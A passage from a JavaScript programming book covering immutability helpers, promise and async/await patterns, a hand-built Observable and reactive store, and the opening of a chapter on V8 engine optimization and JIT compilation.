    }
  }
};

deepFreeze(nested);
nested.user.profile.settings.theme = 'dark'; // Fails
console.log(nested.user.profile.settings.theme); // 'light'
```

### Immutability Helpers

```javascript
// Update helpers
const immutable = {
  set: (obj, key, value) => ({ ...obj, [key]: value }),
  
  delete: (obj, key) => {
    const { [key]: _, ...rest } = obj;
    return rest;
  },
  
  update: (obj, key, fn) => ({
    ...obj,
    [key]: fn(obj[key])
  }),
  
  merge: (obj, updates) => ({ ...obj, ...updates }),
  
  // Array helpers
  push: (arr, item) => [...arr, item],
  
  pop: arr => arr.slice(0, -1),
  
  unshift: (arr, item) => [item, ...arr],
  
  shift: arr => arr.slice(1),
  
  splice: (arr, start, deleteCount, ...items) => [
    ...arr.slice(0, start),
    ...items,
    ...arr.slice(start + deleteCount)
  ],
  
  setIndex: (arr, index, value) => [
    ...arr.slice(0, index),
    value,
    ...arr.slice(index + 1)
  ]
};

// Usage
const user = { name: 'Alice', age: 30 };

const updated = immutable.set(user, 'age', 31);
const withEmail = immutable.merge(updated, { email: 'alice@example.com' });
const incremented = immutable.update(withEmail, 'age', age => age + 1);

console.log(incremented);
// { name: 'Alice', age: 32, email: 'alice@example.com' }

const numbers = [1, 2, 3, 4, 5];
const modified = immutable.splice(numbers, 2, 1, 99, 100);
console.log(modified); // [1, 2, 99, 100, 4, 5]
```

---

## Summary

This document covered Functional Programming Patterns:

- **Function Composition**: Combining functions (compose, pipe, async composition, point-free style)
- **Higher-Order Functions**: Functions that take or return functions (map/filter/reduce, decorators, custom HOFs)
- **Currying and Partial Application**: Transforming functions (auto-curry, partial application, practical examples)
- **Memoization**: Caching function results (basic memoization, advanced options, recursive memoization)
- **Pure Functions**: Functions without side effects (pure vs impure, making functions pure, benefits)
- **Immutability Patterns**: Unchangeable data (immutable arrays/objects, data structures, freeze, helpers)

These patterns promote predictable, testable, and maintainable code through functional programming principles.

---

**Related Topics:**

- Async Patterns
- Functional Libraries (Ramda, Lodash/FP)
- Category Theory
- Monads and Functors
# Async Patterns


## Async Patterns

Async patterns help manage asynchronous operations, handling callbacks, promises, and event-driven programming effectively.

---

## Promise Patterns

Promises represent the eventual completion or failure of an asynchronous operation.

### Basic Promise Patterns

```javascript
// Creating promises
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

const fetchUser = id => new Promise((resolve, reject) => {
  setTimeout(() => {
    if (id > 0) {
      resolve({ id, name: `User ${id}` });
    } else {
      reject(new Error('Invalid ID'));
    }
  }, 1000);
});

// Using promises
fetchUser(1)
  .then(user => console.log('User:', user))
  .catch(error => console.error('Error:', error));

// Chaining promises
fetchUser(1)
  .then(user => {
    console.log('Fetched user:', user);
    return fetchUser(2);
  })
  .then(user2 => {
    console.log('Fetched user 2:', user2);
  })
  .catch(error => console.error('Error:', error));
```

### Promise.all - Parallel Execution

```javascript
// Execute multiple promises in parallel
const fetchMultipleUsers = async ids => {
  const promises = ids.map(id => fetchUser(id));
  return Promise.all(promises);
};

fetchMultipleUsers([1, 2, 3])
  .then(users => {
    console.log('All users:', users);
  })
  .catch(error => {
    console.error('One or more requests failed:', error);
  });

// Practical example: Fetch data from multiple APIs
const fetchDashboardData = async () => {
  try {
    const [users, posts, comments] = await Promise.all([
      fetch('/api/users').then(r => r.json()),
      fetch('/api/posts').then(r => r.json()),
      fetch('/api/comments').then(r => r.json())
    ]);
    
    return { users, posts, comments };
  } catch (error) {
    console.error('Failed to fetch dashboard data:', error);
    throw error;
  }
};
```

### Promise.race - First to Complete

```javascript
// Return first promise to resolve/reject
const timeout = ms => new Promise((_, reject) => 
  setTimeout(() => reject(new Error('Timeout')), ms)
);

const fetchWithTimeout = (url, ms) => {
  return Promise.race([
    fetch(url),
    timeout(ms)
  ]);
};

// Usage
fetchWithTimeout('/api/data', 5000)
  .then(response => response.json())
  .then(data => console.log('Data:', data))
  .catch(error => console.error('Request failed or timed out:', error));

// Practical: Multiple endpoints, use first response
const fetchFromMirrors = urls => {
  const promises = urls.map(url => 
    fetch(url).then(r => r.json())
  );
  
  return Promise.race(promises);
};

fetchFromMirrors([
  'https://api1.example.com/data',
  'https://api2.example.com/data',
  'https://api3.example.com/data'
]).then(data => console.log('Fastest response:', data));
```

### Promise.allSettled - All Results

```javascript
// Wait for all promises to settle (resolve or reject)
const fetchAllData = async ids => {
  const promises = ids.map(id => fetchUser(id));
  const results = await Promise.allSettled(promises);
  
  const successful = results
    .filter(r => r.status === 'fulfilled')
    .map(r => r.value);
  
  const failed = results
    .filter(r => r.status === 'rejected')
    .map(r => r.reason);
  
  return { successful, failed };
};

fetchAllData([1, 2, -1, 3])
  .then(({ successful, failed }) => {
    console.log('Successful:', successful);
    console.log('Failed:', failed);
  });

// Practical: Batch operations with error handling
const batchUpdate = async items => {
  const promises = items.map(item => updateItem(item));
  const results = await Promise.allSettled(promises);
  
  return {
    succeeded: results.filter(r => r.status === 'fulfilled').length,
    failed: results.filter(r => r.status === 'rejected').length,
    results
  };
};
```

### Promise.any - First Successful

```javascript
// Return first promise to resolve (ignore rejections)
const fetchFromBackups = urls => {
  const promises = urls.map(url => 
    fetch(url).then(r => {
      if (!r.ok) throw new Error(`HTTP ${r.status}`);
      return r.json();
    })
  );
  
  return Promise.any(promises);
};

fetchFromBackups([
  'https://primary.example.com/data',
  'https://backup1.example.com/data',
  'https://backup2.example.com/data'
])
  .then(data => console.log('Data from first successful:', data))
  .catch(error => console.error('All requests failed:', error));
```

### Sequential Promise Execution

```javascript
// Execute promises one after another
const sequential = async (tasks) => {
  const results = [];
  
  for (const task of tasks) {
    const result = await task();
    results.push(result);
  }
  
  return results;
};

// Usage
const tasks = [
  () => fetchUser(1),
  () => fetchUser(2),
  () => fetchUser(3)
];

sequential(tasks)
  .then(results => console.log('Sequential results:', results));

// Reduce pattern
const sequentialReduce = tasks => {
  return tasks.reduce(
    (promise, task) => promise.then(results => 
      task().then(result => [...results, result])
    ),
    Promise.resolve([])
  );
};

sequentialReduce(tasks)
  .then(results => console.log('Results:', results));
```

### Promise Retry Pattern

```javascript
const retry = (fn, maxAttempts, delay = 1000) => {
  return new Promise(async (resolve, reject) => {
    for (let attempt = 1; attempt <= maxAttempts; attempt++) {
      try {
        const result = await fn();
        resolve(result);
        return;
      } catch (error) {
        console.log(`Attempt ${attempt} failed:`, error.message);
        
        if (attempt === maxAttempts) {
          reject(error);
          return;
        }
        
        await new Promise(r => setTimeout(r, delay));
      }
    }
  });
};

// Usage
const unreliableAPI = () => {
  return new Promise((resolve, reject) => {
    if (Math.random() < 0.7) {
      reject(new Error('API failed'));
    } else {
      resolve({ data: 'Success!' });
    }
  });
};

retry(unreliableAPI, 3, 500)
  .then(result => console.log('Success:', result))
  .catch(error => console.error('All attempts failed:', error));

// Exponential backoff
const retryWithBackoff = async (fn, maxAttempts) => {
  for (let attempt = 1; attempt <= maxAttempts; attempt++) {
    try {
      return await fn();
    } catch (error) {
      if (attempt === maxAttempts) throw error;
      
      const delay = Math.pow(2, attempt) * 1000; // 2s, 4s, 8s...
      console.log(`Retrying in ${delay}ms...`);
      await new Promise(r => setTimeout(r, delay));
    }
  }
};
```

### Promise Queue

```javascript
class PromiseQueue {
  constructor(concurrency = 1) {
    this.concurrency = concurrency;
    this.running = 0;
    this.queue = [];
  }
  
  add(task) {
    return new Promise((resolve, reject) => {
      this.queue.push({ task, resolve, reject });
      this.run();
    });
  }
  
  async run() {
    if (this.running >= this.concurrency || this.queue.length === 0) {
      return;
    }
    
    this.running++;
    const { task, resolve, reject } = this.queue.shift();
    
    try {
      const result = await task();
      resolve(result);
    } catch (error) {
      reject(error);
    } finally {
      this.running--;
      this.run();
    }
  }
}

// Usage
const queue = new PromiseQueue(2); // Max 2 concurrent

const tasks = Array.from({ length: 10 }, (_, i) => 
  () => new Promise(resolve => {
    console.log(`Task ${i} started`);
    setTimeout(() => {
      console.log(`Task ${i} completed`);
      resolve(i);
    }, 1000);
  })
);

Promise.all(tasks.map(task => queue.add(task)))
  .then(results => console.log('All tasks completed:', results));
```

### Promisify Pattern

```javascript
// Convert callback-based functions to promises
const promisify = fn => {
  return (...args) => {
    return new Promise((resolve, reject) => {
      fn(...args, (error, result) => {
        if (error) {
          reject(error);
        } else {
          resolve(result);
        }
      });
    });
  };
};

// Example: Node.js style callback
const readFile = (path, callback) => {
  setTimeout(() => {
    if (path) {
      callback(null, `Contents of ${path}`);
    } else {
      callback(new Error('Invalid path'));
    }
  }, 100);
};

const readFilePromise = promisify(readFile);

readFilePromise('file.txt')
  .then(contents => console.log(contents))
  .catch(error => console.error(error));

// Generic promisify for multiple arguments
const promisifyAll = obj => {
  const promisified = {};
  
  for (const key in obj) {
    if (typeof obj[key] === 'function') {
      promisified[key] = promisify(obj[key].bind(obj));
    }
  }
  
  return promisified;
};
```

---

## Async/Await Patterns

Async/await provides syntactic sugar for working with promises, making async code look synchronous.

### Basic Async/Await

```javascript
// Async function always returns a promise
async function fetchUser(id) {
  const response = await fetch(`/api/users/${id}`);
  const user = await response.json();
  return user;
}

// Error handling with try/catch
async function fetchUserSafe(id) {
  try {
    const response = await fetch(`/api/users/${id}`);
    
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}`);
    }
    
    const user = await response.json();
    return user;
  } catch (error) {
    console.error('Failed to fetch user:', error);
    throw error;
  }
}

// Usage
fetchUserSafe(1)
  .then(user => console.log('User:', user))
  .catch(error => console.error('Error:', error));
```

### Parallel Async Operations

```javascript
// Sequential (slow)
async function fetchSequential() {
  const user = await fetchUser(1);      // Wait 1s
  const posts = await fetchPosts(1);    // Wait 1s
  const comments = await fetchComments(1); // Wait 1s
  // Total: 3s
  
  return { user, posts, comments };
}

// Parallel (fast)
async function fetchParallel() {
  const [user, posts, comments] = await Promise.all([
    fetchUser(1),        // Start all
    fetchPosts(1),       // at the
    fetchComments(1)     // same time
  ]);
  // Total: 1s (assuming all take 1s)
  
  return { user, posts, comments };
}

// Conditional parallel
async function fetchUserData(userId) {
  // Fetch user first
  const user = await fetchUser(userId);
  
  // Then fetch posts and friends in parallel
  const [posts, friends] = await Promise.all([
    fetchPosts(userId),
    fetchFriends(userId)
  ]);
  
  return { user, posts, friends };
}
```

### Async Error Handling

```javascript
// Multiple try/catch blocks
async function fetchWithMultipleErrors() {
  let user;
  let posts;
  
  try {
    user = await fetchUser(1);
  } catch (error) {
    console.error('Failed to fetch user:', error);
    user = null;
  }
  
  try {
    posts = await fetchPosts(1);
  } catch (error) {
    console.error('Failed to fetch posts:', error);
    posts = [];
  }
  
  return { user, posts };
}

// Error boundaries
async function withErrorBoundary(fn, fallback) {
  try {
    return await fn();
  } catch (error) {
    console.error('Error caught by boundary:', error);
    return fallback;
  }
}

// Usage
const user = await withErrorBoundary(
  () => fetchUser(1),
  { name: 'Guest', id: 0 }
);

// Finally clause
async function fetchWithCleanup() {
  const connection = await openConnection();
  
  try {
    const data = await fetchData(connection);
    return data;
  } catch (error) {
    console.error('Fetch failed:', error);
    throw error;
  } finally {
    await closeConnection(connection);
    console.log('Connection closed');
  }
}
```

### Async Iteration

```javascript
// For await...of
async function* asyncGenerator() {
  for (let i = 1; i <= 5; i++) {
    await delay(1000);
    yield i;
  }
}

async function processAsyncSequence() {
  for await (const value of asyncGenerator()) {
    console.log('Value:', value);
  }
}

// Async iteration over promises
async function* fetchUsers(ids) {
  for (const id of ids) {
    yield await fetchUser(id);
  }
}

async function displayUsers() {
  for await (const user of fetchUsers([1, 2, 3, 4, 5])) {
    console.log('User:', user.name);
  }
}

// Async map
async function asyncMap(array, asyncFn) {
  const results = [];
  
  for (const item of array) {
    results.push(await asyncFn(item));
  }
  
  return results;
}

// Usage
const userIds = [1, 2, 3, 4, 5];
const users = await asyncMap(userIds, fetchUser);

// Parallel async map
async function asyncMapParallel(array, asyncFn) {
  return Promise.all(array.map(asyncFn));
}

const usersParallel = await asyncMapParallel(userIds, fetchUser);
```

### Async Control Flow

```javascript
// Async while loop
async function pollUntilComplete(checkFn, interval = 1000) {
  while (true) {
    const result = await checkFn();
    
    if (result.complete) {
      return result.data;
    }
    
    await delay(interval);
  }
}

// Usage
const jobResult = await pollUntilComplete(
  async () => {
    const status = await checkJobStatus(jobId);
    return {
      complete: status === 'completed',
      data: status
    };
  },
  2000
);

// Async forEach
async function asyncForEach(array, callback) {
  for (let i = 0; i < array.length; i++) {
    await callback(array[i], i, array);
  }
}

// Usage
await asyncForEach([1, 2, 3], async (num) => {
  await delay(1000);
  console.log(num);
});

// Async reduce
async function asyncReduce(array, reducer, initialValue) {
  let accumulator = initialValue;
  
  for (const item of array) {
    accumulator = await reducer(accumulator, item);
  }
  
  return accumulator;
}

// Usage
const total = await asyncReduce(
  [1, 2, 3, 4, 5],
  async (sum, num) => {
    await delay(100);
    return sum + num;
  },
  0
);
```

### Async Memoization

```javascript
const asyncMemoize = fn => {
  const cache = new Map();
  const pending = new Map();
  
  return async (...args) => {
    const key = JSON.stringify(args);
    
    // Return cached result
    if (cache.has(key)) {
      console.log('Cache hit');
      return cache.get(key);
    }
    
    // Return pending promise if in progress
    if (pending.has(key)) {
      console.log('Waiting for pending request');
      return pending.get(key);
    }
    
    // Create new promise
    console.log('New request');
    const promise = fn(...args);
    pending.set(key, promise);
    
    try {
      const result = await promise;
      cache.set(key, result);
      return result;
    } finally {
      pending.delete(key);
    }
  };
};

// Usage
const fetchUserMemoized = asyncMemoize(fetchUser);

// Multiple calls with same ID
const results = await Promise.all([
  fetchUserMemoized(1),
  fetchUserMemoized(1),
  fetchUserMemoized(1)
]);
// Only one actual fetch, others wait or use cache
```

### Async Pipeline

```javascript
const asyncPipe = (...fns) => async x => {
  let result = x;
  
  for (const fn of fns) {
    result = await fn(result);
  }
  
  return result;
};

// Async transformations
const fetchUserData = async id => {
  await delay(100);
  return { id, name: `User ${id}` };
};

const enrichWithPosts = async user => {
  await delay(100);
  return {
    ...user,
    posts: [{ id: 1, title: 'Post 1' }]
  };
};

const calculateStats = async user => {
  await delay(100);
  return {
    ...user,
    stats: { postCount: user.posts.length }
  };
};

// Create pipeline
const getUserComplete = asyncPipe(
  fetchUserData,
  enrichWithPosts,
  calculateStats
);

// Usage
const completeUser = await getUserComplete(1);
console.log(completeUser);
```

---

## Observable Pattern

Observables represent a stream of asynchronous events.

### Basic Observable

```javascript
class Observable {
  constructor(subscribe) {
    this.subscribe = subscribe;
  }
  
  static create(subscribe) {
    return new Observable(subscribe);
  }
  
  map(fn) {
    return Observable.create(observer => {
      return this.subscribe({
        next: value => observer.next(fn(value)),
        error: err => observer.error(err),
        complete: () => observer.complete()
      });
    });
  }
  
  filter(predicate) {
    return Observable.create(observer => {
      return this.subscribe({
        next: value => {
          if (predicate(value)) {
            observer.next(value);
          }
        },
        error: err => observer.error(err),
        complete: () => observer.complete()
      });
    });
  }
}

// Create observable
const numbers$ = Observable.create(observer => {
  observer.next(1);
  observer.next(2);
  observer.next(3);
  observer.next(4);
  observer.next(5);
  observer.complete();
  
  // Return cleanup function
  return () => console.log('Cleanup');
});

// Subscribe
const subscription = numbers$
  .filter(x => x % 2 === 0)
  .map(x => x * 2)
  .subscribe({
    next: value => console.log('Value:', value),
    error: err => console.error('Error:', err),
    complete: () => console.log('Complete')
  });
// Value: 4
// Value: 8
// Complete
```

### Event Observable

```javascript
class Observable {
  constructor(subscribe) {
    this.subscribe = subscribe;
  }
  
  static fromEvent(element, eventName) {
    return new Observable(observer => {
      const handler = event => observer.next(event);
      
      element.addEventListener(eventName, handler);
      
      // Return cleanup
      return () => {
        element.removeEventListener(eventName, handler);
      };
    });
  }
  
  static interval(ms) {
    return new Observable(observer => {
      let count = 0;
      const id = setInterval(() => {
        observer.next(count++);
      }, ms);
      
      return () => clearInterval(id);
    });
  }
  
  static of(...values) {
    return new Observable(observer => {
      values.forEach(value => observer.next(value));
      observer.complete();
    });
  }
}

// Usage
const clicks$ = Observable.fromEvent(button, 'click');

clicks$.subscribe({
  next: event => console.log('Clicked at:', event.clientX, event.clientY)
});

const timer$ = Observable.interval(1000);

const subscription = timer$.subscribe({
  next: count => console.log('Count:', count)
});

// Stop after 5 seconds
setTimeout(() => subscription(), 5000);
```

### Observable Operators

```javascript
class Observable {
  // ... previous code ...
  
  take(count) {
    return Observable.create(observer => {
      let taken = 0;
      
      return this.subscribe({
        next: value => {
          if (taken < count) {
            observer.next(value);
            taken++;
            
            if (taken === count) {
              observer.complete();
            }
          }
        },
        error: err => observer.error(err),
        complete: () => observer.complete()
      });
    });
  }
  
  debounce(ms) {
    return Observable.create(observer => {
      let timeoutId;
      
      return this.subscribe({
        next: value => {
          clearTimeout(timeoutId);
          timeoutId = setTimeout(() => {
            observer.next(value);
          }, ms);
        },
        error: err => observer.error(err),
        complete: () => observer.complete()
      });
    });
  }
  
  throttle(ms) {
    return Observable.create(observer => {
      let lastTime = 0;
      
      return this.subscribe({
        next: value => {
          const now = Date.now();
          
          if (now - lastTime >= ms) {
            observer.next(value);
            lastTime = now;
          }
        },
        error: err => observer.error(err),
        complete: () => observer.complete()
      });
    });
  }
  
  scan(reducer, seed) {
    return Observable.create(observer => {
      let accumulator = seed;
      
      return this.subscribe({
        next: value => {
          accumulator = reducer(accumulator, value);
          observer.next(accumulator);
        },
        error: err => observer.error(err),
        complete: () => observer.complete()
      });
    });
  }
}

// Usage
const clicks$ = Observable.fromEvent(button, 'click');

// Debounce clicks
clicks$
  .debounce(300)
  .subscribe({ next: () => console.log('Clicked') });

// Count clicks
clicks$
  .scan((count, _) => count + 1, 0)
  .subscribe({ next: count => console.log('Click count:', count) });

// Take first 5 clicks
clicks$
  .take(5)
  .subscribe({
    next: () => console.log('Click'),
    complete: () => console.log('Done after 5 clicks')
  });
```

### Subject (Hot Observable)

```javascript
class Subject {
  constructor() {
    this.observers = [];
  }
  
  subscribe(observer) {
    this.observers.push(observer);
    
    return () => {
      const index = this.observers.indexOf(observer);
      if (index > -1) {
        this.observers.splice(index, 1);
      }
    };
  }
  
  next(value) {
    this.observers.forEach(observer => {
      if (observer.next) {
        observer.next(value);
      }
    });
  }
  
  error(err) {
    this.observers.forEach(observer => {
      if (observer.error) {
        observer.error(err);
      }
    });
  }
  
  complete() {
    this.observers.forEach(observer => {
      if (observer.complete) {
        observer.complete();
      }
    });
    this.observers = [];
  }
}

// Usage
const subject = new Subject();

// Multiple subscribers
subject.subscribe({
  next: value => console.log('Subscriber 1:', value)
});

subject.subscribe({
  next: value => console.log('Subscriber 2:', value)
});

// Emit values
subject.next(1); // Both subscribers receive
subject.next(2); // Both subscribers receive

// BehaviorSubject - remembers last value
class BehaviorSubject extends Subject {
  constructor(initialValue) {
    super();
    this.currentValue = initialValue;
  }
  
  subscribe(observer) {
    observer.next(this.currentValue);
    return super.subscribe(observer);
  }
  
  next(value) {
    this.currentValue = value;
    super.next(value);
  }
  
  getValue() {
    return this.currentValue;
  }
}

const behavior$ = new BehaviorSubject(0);

behavior$.subscribe({
  next: value => console.log('Sub 1:', value)
}); // Immediately logs: Sub 1: 0

behavior$.next(1); // Sub 1: 1

behavior$.subscribe({
  next: value => console.log('Sub 2:', value)
}); // Immediately logs: Sub 2: 1
```

---

## Reactive Programming Concepts

Reactive programming is about working with asynchronous data streams.

### Stream Composition

```javascript
// Combining multiple streams
class Observable {
  // ... previous code ...
  
  static merge(...observables) {
    return Observable.create(observer => {
      const subscriptions = observables.map(obs =>
        obs.subscribe({
          next: value => observer.next(value),
          error: err => observer.error(err)
        })
      );
      
      return () => subscriptions.forEach(unsub => unsub());
    });
  }
  
  static combineLatest(...observables) {
    return Observable.create(observer => {
      const values = new Array(observables.length);
      const hasValue = new Array(observables.length).fill(false);
      let completed = 0;
      
      const subscriptions = observables.map((obs, index) =>
        obs.subscribe({
          next: value => {
            values[index] = value;
            hasValue[index] = true;
            
            if (hasValue.every(Boolean)) {
              observer.next([...values]);
            }
          },
          complete: () => {
            completed++;
            if (completed === observables.length) {
              observer.complete();
            }
          }
        })
      );
      
      return () => subscriptions.forEach(unsub => unsub());
    });
  }
}

// Usage
const temp$ = Observable.interval(1000).map(() => 
  Math.round(Math.random() * 30 + 10)
);

const humidity$ = Observable.interval(1500).map(() => 
  Math.round(Math.random() * 50 + 30)
);

Observable.combineLatest(temp$, humidity$)
  .subscribe({
    next: ([temp, humidity]) => {
      console.log(`Temperature: ${temp}Â°C, Humidity: ${humidity}%`);
    }
  });
```

### Reactive State Management

```javascript
class Store {
  constructor(initialState) {
    this.state$ = new BehaviorSubject(initialState);
  }
  
  select(selector) {
    return this.state$.map(selector);
  }
  
  setState(updater) {
    const currentState = this.state$.getValue();
    const newState = typeof updater === 'function'
      ? updater(currentState)
      : { ...currentState, ...updater };
    
    this.state$.next(newState);
  }
  
  getState() {
    return this.state$.getValue();
  }
}

// Usage
const store = new Store({
  user: null,
  count: 0,
  items: []
});

// Subscribe to specific parts
store.select(state => state.count).subscribe({
  next: count => console.log('Count:', count)
});

store.select(state => state.user).subscribe({
  next: user => console.log('User:', user)
});

// Update state
store.setState({ count: 1 }); // Count: 1
store.setState(state => ({ count: state.count + 1 })); // Count: 2
store.setState({ user: { name: 'Alice' } }); // User: { name: 'Alice' }
```

### Reactive Forms

```javascript
class FormControl {
  constructor(initialValue = '') {
    this.value$ = new BehaviorSubject(initialValue);
    this.errors$ = new BehaviorSubject([]);
    this.validators = [];
  }
  
  setValue(value) {
    this.value$.next(value);
    this.validate();
  }
  
  addValidator(validator) {
    this.validators.push(validator);
    this.validate();
  }
  
  validate() {
    const value = this.value$.getValue();
    const errors = [];
    
    for (const validator of this.validators) {
      const error = validator(value);
      if (error) errors.push(error);
    }
    
    this.errors$.next(errors);
  }
  
  get isValid$() {
    return this.errors$.map(errors => errors.length === 0);
  }
}

// Usage
const emailControl = new FormControl('');

emailControl.addValidator(value => 
  !value ? 'Required' : null
);

emailControl.addValidator(value =>
  !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value) ? 'Invalid email' : null
);

// Subscribe to changes
emailControl.value$.subscribe({
  next: value => console.log('Email:', value)
});

emailControl.errors$.subscribe({
  next: errors => console.log('Errors:', errors)
});

emailControl.isValid$.subscribe({
  next: isValid => console.log('Valid:', isValid)
});

// User types
emailControl.setValue('test'); // Invalid email
emailControl.setValue('test@example.com'); // Valid
```

### Reactive Data Flow

```javascript
// Data flow with transformations
class DataFlow {
  constructor() {
    this.source$ = new Subject();
    
    // Transform stream
    this.processed$ = this.source$
      .filter(data => data.value > 0)
      .map(data => ({
        ...data,
        doubled: data.value * 2
      }))
      .debounce(300);
    
    // Side effects
    this.processed$.subscribe({
      next: data => this.saveToDatabase(data)
    });
    
    // Aggregations
    this.count$ = this.source$
      .scan((count, _) => count + 1, 0);
    
    this.sum$ = this.source$
      .filter(data => data.value > 0)
      .map(data => data.value)
      .scan((sum, value) => sum + value, 0);
  }
  
  emit(data) {
    this.source$.next(data);
  }
  
  saveToDatabase(data) {
    console.log('Saving to database:', data);
  }
}

// Usage
const flow = new DataFlow();

flow.count$.subscribe({
  next: count => console.log('Count:', count)
});

flow.sum$.subscribe({
  next: sum => console.log('Sum:', sum)
});

flow.emit({ value: 5 });
flow.emit({ value: -3 });
flow.emit({ value: 10 });
```

---

## Summary

This document covered Async Programming Patterns:

- **Promise Patterns**: Basic promises, Promise.all/race/allSettled/any, sequential execution, retry, queue, promisify
- **Async/Await Patterns**: Basic async/await, parallel operations, error handling, async iteration, control flow, memoization, pipelines
- **Observable Pattern**: Basic observables, event observables, operators (map, filter, debounce, throttle), subjects
- **Reactive Programming**: Stream composition, reactive state management, reactive forms, data flow

These patterns enable effective handling of asynchronous operations and event-driven programming.

---

**Related Topics:**

- RxJS Library
- Promise Libraries (Bluebird, Q)
- Async Generators
- WebSockets and Real-time Communication

## 22.6 Design Patterns Summary

| Category | Patterns |
|----------|----------|
| **Creational** | Factory, Singleton, Builder, Prototype |
| **Structural** | Adapter, Decorator, Facade, Proxy |
| **Behavioral** | Observer, Strategy, Command, State |
| **Functional** | Composition, Currying, Memoization |
| **Async** | Promise chains, Async Queue, Retry |

---

**End of Chapter 22: Design Patterns**


# 23-Performance-Optimization.md

# 23 Performance Optimization

Performance matters for user experience. This chapter covers JavaScript optimization, algorithm complexity, memory management, rendering, and bundle optimization.

---

## 23.1 JavaScript Engine Optimization

Modern JavaScript engines like V8 (Chrome, Node.js), SpiderMonkey (Firefox), and JavaScriptCore (Safari) use sophisticated optimization techniques.

### V8 Optimization Tips

V8 uses multiple compilation tiers and optimization strategies to make JavaScript fast.

#### Monomorphic vs Polymorphic Code

```javascript
// MONOMORPHIC (FAST) - Always receives same type
function addMonomorphic(obj) {
  return obj.x + obj.y;
}

// Always called with same shape
addMonomorphic({ x: 1, y: 2 });
addMonomorphic({ x: 3, y: 4 });
addMonomorphic({ x: 5, y: 6 });

// POLYMORPHIC (SLOWER) - Receives different types
function addPolymorphic(obj) {
  return obj.x + obj.y;
}

// Called with different shapes
addPolymorphic({ x: 1, y: 2 });
addPolymorphic({ x: 3, y: 4, z: 5 }); // Different shape
addPolymorphic({ y: 6, x: 7 }); // Different property order
addPolymorphic({ x: '8', y: '9' }); // Different types

// MEGAMORPHIC (SLOWEST) - Too many different types
// V8 gives up optimization after ~4 different shapes
```

#### Optimizing Object Creation

```javascript
// BAD: Different shapes
function createUser1(name, age) {
  const user = {};
  user.name = name;
  if (age) {
    user.age = age; // Sometimes added, sometimes not
  }
  return user;
}

// GOOD: Consistent shape
function createUser2(name, age) {
  return {
    name: name,
    age: age || null // Always has same properties
  };
}

// BETTER: Use constructor or class
class User {
  constructor(name, age) {
    this.name = name;
    this.age = age || null;
  }
}

function createUser3(name, age) {
  return new User(name, age);
}

// Benchmark
console.time('inconsistent');
for (let i = 0; i < 1000000; i++) {
  createUser1('Alice', i % 2 ? 30 : undefined);
}
console.timeEnd('inconsistent');

console.time('consistent');
for (let i = 0; i < 1000000; i++) {
  createUser2('Alice', i % 2 ? 30 : null);
}
console.timeEnd('consistent');

console.time('class');
for (let i = 0; i < 1000000; i++) {
  createUser3('Alice', i % 2 ? 30 : null);
}
console.timeEnd('class');
```

#### Array Optimization

```javascript
// BAD: Mixed types in array
const mixedArray = [1, 'two', 3, 'four', 5];
// V8 can't optimize - switches to slower "dictionary mode"

// GOOD: Consistent types
const numbersArray = [1, 2, 3, 4, 5];
const stringsArray = ['one', 'two', 'three', 'four', 'five'];

// BAD: Holes in array
const sparseArray = [1, 2, 3];
sparseArray[100] = 100; // Creates holes
// V8 uses slower hash table representation

// GOOD: Dense arrays
const denseArray = new Array(100).fill(0);
denseArray[50] = 50;

// BAD: Changing array length frequently
const dynamic = [];
for (let i = 0; i < 1000; i++) {
  dynamic.push(i);
  if (i % 10 === 0) {
    dynamic.pop(); // Frequent size changes
  }
}

// GOOD: Pre-allocate if size is known
const preallocated = new Array(1000);
for (let i = 0; i < 1000; i++) {
  preallocated[i] = i;
}

// BAD: delete on arrays
const arr = [1, 2, 3, 4, 5];
delete arr[2]; // Creates hole, degrades performance

// GOOD: splice or filter
const arr2 = [1, 2, 3, 4, 5];
arr2.splice(2, 1); // Maintains dense array
```

#### Function Optimization

```javascript
// BAD: Functions with too many arguments (>4 becomes slower)
function tooManyArgs(a, b, c, d, e, f, g, h) {
  return a + b + c + d + e + f + g + h;
}

// GOOD: Use object parameter
function betterArgs({ a, b, c, d, e, f, g, h }) {
  return a + b + c + d + e + f + g + h;
}

// BAD: try-catch in hot code
function hotFunction(x) {
  try {
    return x * 2; // Normal code shouldn't be in try
  } catch (e) {
    return 0;
  }
}

// GOOD: Minimize try-catch scope
function hotFunction2(x) {
  return x * 2;
}

function callHotFunction(x) {
  try {
    return hotFunction2(x);
  } catch (e) {
    return 0;
  }
}

// BAD: arguments object
function useArguments() {
  return Array.prototype.slice.call(arguments);
}

// GOOD: Rest parameters
function useRest(...args) {
  return args;
}
```

### JIT Compilation

V8 uses Just-In-Time compilation to optimize hot code paths.

#### Compilation Pipeline

```javascript
/*
V8 Compilation Pipeline:
1. Ignition (Interpreter) - Runs code quickly with baseline performance
2. TurboFan (Optimizing Compiler) - Optimizes hot functions

Code starts in interpreter, then:
- If function is called many times â†’ TurboFan optimizes it
- If assumptions break â†’ Deoptimizes back to interpreter
*/

// Example: Hot function that gets optimized
function fibonacci(n) {
  if (n <= 1) return n;
  return fibonacci(n - 1) + fibonacci(n - 2);
}

// Called many times - gets optimized by TurboFan
console.time('first run');
fibonacci(20);
console.timeEnd('first run');

console.time('optimized run');
fibonacci(20); // Faster after optimization
console.timeEnd('optimized run');
```

#### Optimization Flags

```javascript
// Check optimization status (V8 specific, requires --allow-natives-syntax flag)

// Run with: node --allow-natives-syntax script.js

function add(a, b) {
  return a + b;
}

// Force optimization (for testing)
// %OptimizeFunctionOnNextCall(add);

// Warm up function
for (let i = 0; i < 10000; i++) {
  add(i, i + 1);
}

// Check if optimized
// console.log(%GetOptimizationStatus(add));

// Force deoptimization
// %DeoptimizeFunction(add);
```

#### Inline Caching Tiers

```javascript
// Inline caching progression: Uninitialized â†’ Monomorphic â†’ Polymorphic â†’ Megamorphic

class Point {
  constructor(x, y) {
    this.x = x;
    this.y = y;
  }
}

function distance(p) {
  return Math.sqrt(p.x * p.x + p.y * p.y);
}

// First call - cache miss (uninitialized)
distance(new Point(3, 4));

// Subsequent calls with same shape - cache hit (monomorphic - FAST)
for (let i = 0; i < 10000; i++) {
  distance(new Point(i, i + 1));
}

// Different shape - polymorphic (slower)
distance({ x: 5, y: 6, z: 7 });

// Too many shapes - megamorphic (slowest)
distance({ y: 8, x: 9 }); // Different property order
distance({ x: '10', y: '11' }); // Different types
```

### Hidden Classes and Inline Caching

V8 uses hidden classes (also called shapes or maps) to optimize property access.

#### Hidden Classes

```javascript
// Objects with same properties in same order share hidden class

